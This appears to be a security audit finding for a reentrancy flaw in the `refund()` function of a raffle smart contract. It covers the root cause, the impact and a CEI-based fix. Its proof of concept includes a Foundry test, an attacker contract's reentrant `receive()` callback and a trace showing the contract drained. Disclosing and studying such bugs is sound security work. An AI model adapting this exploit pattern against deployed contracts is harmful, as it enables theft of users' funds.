# [H-01] Reentrancy in `refund` allows draining the contract

**Target:** `src/PuppyRaffle.sol` — `refund()`
**Severity:** High
**Status:** Confirmed with PoC

## Summary

`refund()` sends ETH to the caller before updating state, violating the
Checks-Effects-Interactions (CEI) pattern. A malicious contract can re-enter
`refund()` during the external call and withdraw its entrance fee multiple
times, draining the contract's balance.

## Root cause

The external call runs before the state update:

    payable(msg.sender).sendValue(entranceFee);   // Interaction (first)
    players[playerIndex] = address(0);            // Effect (after — too late)

Because `players[playerIndex]` is still the attacker's address when
`sendValue` triggers the attacker's `receive()`, the `require(playerAddress
!= address(0))` check passes again on re-entry, and the refund repeats.

The reentrancy is exploitable because OpenZeppelin's `sendValue` performs a
low-level `call` that forwards all remaining gas to the recipient — enough for
the attacker's `receive()` to call back into `refund()`. Had the contract used
`transfer()` or `send()` (2300 gas stipend), the recipient would not have
enough gas to re-enter, and the bug would not be exploitable. The pinned
compiler and dependency versions are part of the audit scope for this reason.

## Impact

Complete loss of contract funds. Any player can steal all ETH held by the
raffle — the entrance fees of every other participant plus any accrued
protocol fees.

## Recommended mitigation

The fix is to apply CEI — update state before the external call:

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
    payable(msg.sender).sendValue(entranceFee);

This removes the root cause. As defense in depth, a `nonReentrant` modifier
(OpenZeppelin `ReentrancyGuard`) can also be added, but CEI is the primary
correction.

## Proof of Concept

The following Foundry test deploys an attacker contract that re-enters
`refund()` through its `receive()`, draining the raffle in a single
transaction. The full, runnable PoC lives in the scope repository; the files
under `poc/` are included here as reference and do not compile standalone.

```solidity
function test_reentrancy_drains_contract() public {
    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
    vm.deal(address(attacker), entranceFee * 2);

    uint256 balanceBefore = address(puppyRaffle).balance;
    attacker.attack{value: entranceFee}();
    uint256 balanceAfter = address(puppyRaffle).balance;

    assertLt(balanceAfter, entranceFee);                // raffle drained
    assertGt(address(attacker).balance, entranceFee);   // attacker profited: theft, not just drain
    assertLt(balanceAfter, balanceBefore);
}
```

The attacker's `receive()` holds the reentrant call, guarded by a stop
condition so the final call does not revert:

```solidity
receive() external payable {
    // Re-enter while the raffle still holds at least one fee.
    // players[attackerIndex] is not yet zeroed, so the check passes again.
    if (address(puppyRaffle).balance >= entranceFee) {
        puppyRaffle.refund(attackerIndex);
    }
}
```

The execution trace shows `refund(4)` being called five times in a nested
fashion before any state update — once for each fee held by the contract
(4 players + the attacker):

```
[91802] PuppyRaffle::refund(4)
  ├─ [78421] ReentrancyAttacker::receive{value: 1e18}()
  │   ├─ [72801] PuppyRaffle::refund(4)
  │   │   ├─ [59420] ReentrancyAttacker::receive{value: 1e18}()
  │   │   │   ├─ [53800] PuppyRaffle::refund(4)
  │   │   │   │   ├─ [40419] ReentrancyAttacker::receive{value: 1e18}()
  │   │   │   │   │   ├─ [34799] PuppyRaffle::refund(4)
  │   │   │   │   │   │   ├─ [21418] ReentrancyAttacker::receive{value: 1e18}()
  │   │   │   │   │   │   │   ├─ [15798] PuppyRaffle::refund(4)
  │   │   │   │   │   │   │   │   ├─ [2417] ReentrancyAttacker::receive{value: 1e18}()
  │   │   │   │   │   │   │   │   │   └─ ← [Stop]
```

The final `receive()` costs only 2417 gas and does not re-enter: the raffle's
balance has dropped below one `entranceFee`, so the stop condition halts the
cascade. Result: `[PASS]`. The raffle ends with less than one `entranceFee`,
and the attacker ends with more ETH than it contributed (`assertGt`),
confirming the theft of the other participants' fees.
